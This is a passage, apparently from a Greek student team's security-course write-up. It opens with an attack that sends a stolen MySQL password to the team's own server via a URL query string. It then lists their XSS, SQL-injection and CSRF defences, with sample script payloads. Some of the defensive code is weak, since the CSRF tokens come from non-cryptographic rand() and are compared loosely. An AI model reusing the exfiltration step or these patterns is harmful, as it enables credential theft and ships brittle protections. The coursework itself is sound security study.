$mysqlPassword και κάνει request στον server του online vm μας δηλαδή http://cybergh0sts.csec.chatzi.org/index.php?pass=$mysqlPassword
Έτσι αποκτήσαμε τον κωδικό του διαχειριστή και με αυτόν , πρόσβαση στον διαχειριστή .


Άμυνες :

Άμυνες από την πλευρά του server :
Αρχικά βάλαμε σε πολλους φακέλους(όπως πχ στο /modules/admin/mysql),που απαγορευεται κανονικά η πρόσβαση απο απλούς χρήστες, 
ένα .htaccess έτσι ώστε να τους προστατεύσουμε . Σε κάποια από αυτά βάλαμε "Deny from all" και στου /modules/admin/mysql
βάλαμε έναν κωδικό με κάποιον χρήστη που φτιάξαμε .

Άμυνες σε XSS :  
α) Σε αρκετά σημεία όπως στο modules/agenda/myagenda.php?month=6&year=2020<script>xss</script>
χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο year του URL , επιστρέφουμε τον 
χρήστη στο αρχικό modules/agenda/myagenda.php , με τον παρακάτω τρόπο
```
if (preg_match("/[^0-9]/", $year) or preg_match("/[^0-9]/" , $month) ) {
  header('Location: ./myagenda.php');
  exit();
}
else {
  $year = preg_replace("/[^0-9]/" , '' , $year);
  $month = preg_replace("/[^0-9]/", '' , $month);
}
```

β) Σε κάποια άλλα σημεία όπως στην τηλεσυνεργασία δεν θέλαμε να διαγράψουμε τελείως το μήνυμα του χρήστη σε περίπτωση
που έκανε xss παρά θέλαμε να διατηρηθεί το μήνυμα χωρίς να εκτελεστεί . Αυτό το πετύχαμε με το sanitization , δηλαδή\
```$chatLine = filter_var($chatLine , FILTER_SANITIZE_FULL_SPECIAL_CHARS);```\
πράγμα που έκανε sanitize τους ειδικούς χαρακτήρες , οπότε ακόμα και αν ο χρήστης έγραφε <script>alert(...)</script>
θα εκτυπωνώταν στο τσατ το <script>alert(...)</script> , αλλά δεν θα εκτελείτο .

γ) Άλλες φορές χρησιμοποιήσαμε το απλό filtering δηλαδή
```
$email = filter_var($email , FILTER_SANITIZE_EMAIL);
$uname = preg_replace("/[^A-Za-z0-9]/", '', $uname);
$nom_form = preg_replace("/[^A-Za-z0-9]/", '', $nom_form);
$prenom_form = preg_replace("/[^A-Za-z0-9]/", '', $prenom_form);
$am = preg_replace("/[^0-9]/", '', $am);
```
δ) Τέλος αν για κάποιο λόγο κάποιος έγραφε στο URL πχ http://cybergh0sts.chatzi.org/index.php/""> μπορούσε
να κάνει GET request στο site και να τυπώσει κάτι , οπότε μπορούσε να κάνει και xss . Προκειμένου να το διορθώσουμε
αυτό κόβαμε οποιουσδήποτε χαρακτήρες υπάρχουν μετά το .php με τον παρακάτω κώδικα , ο οποίος προστέθηκε πάνω πάνω 
σε κάθε αρχείο 
```
if (preg_match('/\.php\//' , $_SERVER['PHP_SELF'])){
	header("Location: " . preg_replace('/\.php.*/' , '' , $_SERVER['PHP_SELF']) . ".php");
	exit();
}
```

Άμυνες σε SQLi :\
α) Σε αρκετά σημεία όπως στο modules/auth/contactadmin.php?userid=1
χρησιμοποιήσαμε cut filtering , δηλαδή αν πάρουμε κάτι διαφορετικό εκτός από αριθμό στο userid του URL , επιστρέφουμε τον 
χρήστη στο αρχικό index.php , με τον παρακάτω τρόπο
```
if (preg_match("/[^0-9]/", $userid)){
	header("Location: ../index.php");
	exit();
}
```

β) Σε άλλα σημεία χρησιμοποιήσαμε το full filtering σε συνδυασμό με το preg_match δηλαδή :
```
if (preg_match("/[^0-9]/", $id)){
	unset($id);
	show_student_assignments();
}
else {
	$id = preg_replace("/[^0-9]/", '', $id);
```
ή πχ στο upgrade/upgrade_functions.php
```
if (preg_match("/[^a-zA-Z]/", $username) ){
	header("Location: " . $_SERVER['PHP_SELF']);
	exit();
}

$username = preg_replace("/[^a-zA-Z]/", '',  $username);
```

Άμυνες σε CSRF :\
α) Για την άμυνα ενάντια σε csrf πάνω σε φόρμες χρησιμοποιήσαμε tokens τα οποία τα βάζαμε ως hidden element της φόρμας δηλαδή\
```<input type=\"hidden\" name=\"token\" value=".$_SESSION['tok'].">```
Για την δημιουργία του token φτιάξαμε την παρακάτω συνάρτηση που ανάλογα με το n παράγει μια τυχαία συμβολοσειρά με μήκος n
```
function get_rand_pwd($n) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
  
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
  
    return $randomString;
} 
```
To token αρχικοποιείται στο index όπως φαίνεται παρακάτω :
```
$n=25; 
$fakepwd = get_rand_pwd($n);
$_SESSION['tok'] = $fakepwd;
```
Tέλος κάνοντας submit την φόρμα ελέγχουμε αν το token της φόρμας είναι ίδιο με το token του session όπως παρακάτω :
```
if ($_REQUEST['token'] != $_SESSION['tok']){
	echo 'Request error!';
	die;
}
```
       
       
       
       
